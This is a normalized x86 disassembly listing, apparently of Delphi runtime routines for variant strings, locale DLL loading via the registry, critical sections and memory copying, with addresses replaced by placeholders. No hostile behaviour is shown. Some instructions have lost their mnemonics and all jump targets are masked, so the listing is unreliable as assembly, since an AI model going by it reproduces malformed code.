mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_44d7ac
retn
mov eax [ ebp - 0x14 ]
call sub_44d9e4
jmp r-xdata
cmp ax 0x8
jne r-xdata
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
mov cx 0x8
call sub_44d910
xor eax eax
push ebp
push sub_44dae2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
call sub_44d9b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_44d7ac
retn
mov eax [ ebp - 0x14 ]
call sub_44d9b4
jmp r-xdata
sub_44daf8
cmp [ edx ] 0x100
jne r-xdata
push ebx
mov ebx eax
sub esp 0x10
mov [ esp ] 0x0
mov eax esp
mov ecx 0x100
call sub_44da04
mov eax ebx
call sub_44cae0
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
add esp 0x10
pop ebx
retn
mov edx [ edx + 0x8 ]
jmp sub_44cb34
sub_44db34
cmp [ eax ] 0x8
jb r-xdata
test edx edx
je r-xdata
push eax
push edx
call sub_44d7ac
pop edx
pop eax
mov [ eax ] 0x100
mov [ eax + 0x8 ] edx
retn
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_44cba4
mov edx eax
pop eax
push edx
mov ecx [ edx - 0x4 ]
call sub_44bbe8
pop edx
pop eax
[ edx - 0x8 ]
jmp r-xdata
sub_44db74
push eax
cmp [ eax ] 0x8
jb r-xdata
xor eax eax
test edx edx
je r-xdata
push edx
call sub_44d7ac
pop edx
pop edx
mov [ edx ] 0x8
mov [ edx + 0x8 ] eax
retn
mov eax [ edx - 0x4 ]
shr eax 0x1
je r-xdata
push eax
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_44bb50
sub_44dc04
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax [ esi + 0x2 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x6 ]
test eax eax
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_44dbfc
jmp r-xdata
mov al 0x4
call sub_44bb50
xor esi esi
mov esi [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_44bb50
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_44ba8c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_44ba5c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_44bd90
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_44d340
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bbe8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_44bd90
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_44dbe4
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_44dc04
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_44dd9c
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ edx + ecx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_44ba74
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_44d340
sub_44ddd8
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_44dd9c
pop edx
pop eax
sub_44de00
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call VirtualQuery
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_44de30
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax [ edx + 0x10 ]
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_44de68
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
add ebx 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call [ ebp - 0xc ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_44de54
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpyA
jmp r-xdata
lea eax [ ebx + 0x1 ]
call sub_44de54
mov edi eax
mov eax edi
sub eax ebx
mov edx eax
add edx esi
inc edx
cmp edx 0x105
jg r-xdata
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpyA
lea eax [ ebx + 0x1 ]
call sub_44de54
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
inc eax
push eax
push ebx
lea eax [ ebp - 0x24f ]
add eax esi
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
jmp r-xdata
push ebx
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ esi + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov esi ebx
sub esi [ ebp - 0x4 ]
lea eax [ esi + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + esi - 0x24f ] 0x5c
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax esi
inc eax
push eax
call lstrcpyA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add esi eax
mov ebx edi
sub_44e010
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call GetModuleFileNameA
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf003f
push 0x0
push r-xdata
push 0x80000001
call RegOpenKeyExA
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_44e0dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
call sub_44de68
push eax
mov eax [ ebp - 0x8 ]
push eax
call RegQueryValueExA
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf003f
push 0x0
push r-xdata
push 0x80000001
call RegOpenKeyExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegQueryValueExA
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpyA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call GetThreadLocale
push eax
call GetLocaleInfoA
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpyA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpyA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpyA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_44e23c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_44ba74
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_44ba74
jmp r-xdata
sub_44e29c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_44c4bc#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_44e308
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_44e36c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44e29c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e373
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_44e378
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_44cc98
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_44de30
push eax
call LoadStringA
mov ecx eax
mov edx esp
mov eax esi
call sub_44cbc8
jmp r-xdata
sub_44e3e8
mov ecx [ eax ]
mov [ eax ] edx
test edx edx
je r-xdata
test ecx ecx
je r-xdata
push ecx
push edx
mov eax [ edx ]
call [ eax + 0x4 ]
pop ecx
retn
push ecx
mov eax [ ecx ]
call [ eax + 0x8 ]
sub_44e43c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_44c104
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_44e478
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_44e4a0
push ebx
mov ebx eax
mov edx [ eax + 0x4 ]
sub edx 0xd7b1
je r-xdata
call [ ebx + 0x24 ]
test eax eax
jne r-xdata
cmp edx 0x2
ja r-xdata
call sub_44bbb4
jmp r-xdata
pop ebx
retn
cmp eax rw-data
je r-xdata
call [ eax + 0x1c ]
test eax eax
jne r-xdata
mov eax 0x67
jmp r-xdata
mov eax ebx
sub_44e4dc
cmp [ eax + 0x4 ] 0xd7b1
jne r-xdata
cmp eax rw-data
je r-xdata
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x10 ]
jae r-xdata
call j_sub_449a4c#3
mov eax rw-data
cmp [ eax + 0x4 ] 0xd7b1
je r-xdata
mov eax 0x68
call sub_44bbb4
mov al 0x1a
retn
push eax
call [ eax + 0x1c ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x14 ]
mov cl [ ecx + edx ]
cmp cl 0x1a
je r-xdata
jmp r-xdata
call sub_44bbb4
pop eax
mov al 0x1a
retn
pop eax
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x10 ]
jb r-xdata
mov al cl
retn
inc edx
mov [ eax + 0xc ] edx
mov ecx [ eax + 0x14 ]
mov [ ecx + edx ] 0x1a
inc [ eax + 0x10 ]
mov al 0x1a
retn
sub_44e550
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e5ae
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e5b5
retn
mov eax rw-data
call sub_44e4a0
mov eax rw-data
call sub_44e4a0
call sub_44ae8c
mov eax rw-data
call sub_44dba8
mov eax rw-data
call sub_44dba8
mov eax rw-data
call sub_44dba8
sub_44e5b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e6a0
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e6a7
retn
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x2
mov [ rw-data ] 0x2
mov [ rw-data ] 0x3
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] 0xa
mov [ rw-data ] 0x80020004
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_44d79c
mov [ rw-data ] r-xdata
call sub_44beb8
test al al
je r-xdata
call sub_44bfac
mov eax rw-data
mov edx r-xdata
call sub_4497b2
mov eax rw-data
mov edx r-xdata
call sub_4497b2
call GetCommandLineA
mov [ rw-data ] eax
call sub_44a718
mov [ rw-data ] eax
call GetCurrentThreadId
mov [ rw-data ] eax
call sub_44bee8
sub_44e6b0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
push esi
call sub_44ebd4
pop ecx
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
push esi
push 0x0
push ebx
call sub_44f094
add esp 0xc
sub_44e710
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
push esi
push edi
lea edi [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
call sub_44f3b0
test ebx ebx
jne r-xdata
push ebx
call sub_44ebd4
pop ecx
mov esi eax
test eax eax
je r-xdata
mov ebx 0x1
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x18 ] 0x8
mov [ edi ] rw-data
inc [ ebp - 0xc ]
mov [ edi ] rw-data
inc [ ebp - 0xc ]
push edi
push r-xdata
call sub_4564e0
add esp 0x24
call [ rw-data ]
jmp r-xdata
sub_44e8c0
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
call sub_44f3b0
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x4 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] rw-data
inc [ ebp - 0xc ]
mov [ ebp - 0x4 ] rw-data
inc [ ebp - 0xc ]
push ecx
push r-xdata
call sub_4564e0
add esp 0x24
mov esp ebp
pop ebp
retn
sub_44e920
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x8
mov [ rw-data ] rw-data
inc [ ebp - 0x8 ]
mov [ rw-data ] rw-data
inc [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_44e960
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_44f3b0
sub [ ebp - 0x8 ] 0x2
push 0x2
push rw-data
call sub_44efc8
add esp 0x8
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_44e9b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push rw-data
call GetModuleHandleA
mov ebx eax
test ebx ebx
jne r-xdata
push rw-data
push ebx
call GetProcAddress
mov [ esi ] eax
push rw-data
push ebx
call GetProcAddress
mov [ edi ] eax
push rw-data
push ebx
call GetProcAddress
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax 0x1
sub_44ea30
push ebx
push esi
mov esi rw-data
push rw-data
call GetModuleHandleA
mov ebx eax
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
call sub_44e994
push rw-data
push rw-data
push rw-data
call sub_44e9b4
add esp 0xc
push rw-data
mov edx [ rw-data ]
push edx
call GetProcAddress
mov [ rw-data ] eax
push rw-data
mov ecx [ rw-data ]
push ecx
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov [ esi + 0xc ] sub_44ece8
mov [ esi + 0x10 ] sub_44eccc
mov [ esi + 0x14 ] sub_44ed0c
mov [ esi + 0x18 ] sub_44ed5c
mov [ esi + 0x8 ] 0x3
mov eax 0x1
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_454630
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_454630
pop ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0xc ] sub_44eb64
mov [ esi + 0x10 ] sub_44eb78
mov [ esi + 0x14 ] sub_44eb90
mov [ esi + 0x18 ] sub_44ebcc
mov [ esi + 0x8 ] 0x2
mov edx [ rw-data ]
push edx
mov ecx [ rw-data ]
push ecx
mov eax [ rw-data ]
push eax
call sub_44eda4
add esp 0xc
call [ rw-data ]
mov eax 0x1
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
sub_44eb90
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov ecx eax
mov eax edx
mov edx ecx
call [ rw-data ]
pop ebp
retn
mov eax edx
call [ rw-data ]
jmp r-xdata
xor eax eax
pop ebp
retn
call [ rw-data ]
pop ebp
retn
sub_44ec0c
push ebp
mov ebp esp
call sub_44ea30
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
mov [ rw-data ] sub_44ece8
mov [ rw-data ] sub_44eccc
mov [ rw-data ] sub_44ed0c
mov [ rw-data ] sub_44ed5c
mov [ rw-data ] 0x4
sub_44ec84
push ebp
mov ebp esp
push 0x1
call sub_44ec0c
pop ecx
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call [ rw-data ]
add esp 0x8
pop ebp
retn
sub_44eccc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
call sub_44badc
mov eax ebx
call [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44ece8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
lea eax [ ebp - 0xc ]
call sub_44badc
mov eax ebx
call [ ebp - 0x8 ]
sub_44ed0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_44badc
test esi esi
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov esi ebx
mov eax esi
call [ ebp - 0x10 ]
xor eax eax
jmp r-xdata
mov edi ebx
mov [ ebp - 0x4 ] esi
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov eax esi
call [ ebp - 0xc ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ed60
mov eax edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] 0x1
call sub_44e5b8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov [ ecx ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
sub_44eda4
push ebp
mov ebp esp
add esp 0xfffffff4
call sub_44bb14
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
call sub_44baf8
sub_44edd4
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
push eax
push r-xdata
push 0x0
push 0x1
call sub_44fb8c
add esp 0xc
push eax
call sub_44fb18
add esp 0x8
retn
sub_44ee04
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x14 ] 0x8
push rw-data
call InitializeCriticalSection
mov [ rw-data ] 0x1
inc [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_44ee40
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_44f3b0
dec [ ebp - 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
xor edx edx
push rw-data
mov [ rw-data ] edx
call DeleteCriticalSection
sub_44ef6c
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_44f3b0
dec [ ebp - 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
xor edx edx
push rw-data
mov [ rw-data ] edx
call DeleteCriticalSection
sub_44efa8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov [ eax ] rw-data
test [ ebp + 0xc ] 0x1
je r-xdata
push eax
call sub_44e6dc
pop ecx
sub_44efc8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0x8
mov edx [ ebp + 0x8 ]
mov [ edx ] rw-data
dec [ ebp - 0x8 ]
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_44efa8
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_44e6dc
pop ecx
sub_44f024
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x1
shr ecx 0x1
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
retn
sub_44f048
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
cmp edi esi
jb r-xdata
cld
shr ecx 0x1
shr ecx 0x1
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn
std
lea esi [ esi + ecx - 0x1 ]
lea edi [ edi + ecx - 0x1 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx edx
shr ecx 0x1
shr ecx 0x1
sub esi 0x3
sub edi 0x3
[ edi ] [ esi ]
cld
jmp r-xdata
sub_44f094
push ebp
mov ebp esp
push edi
mov al [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov ah al
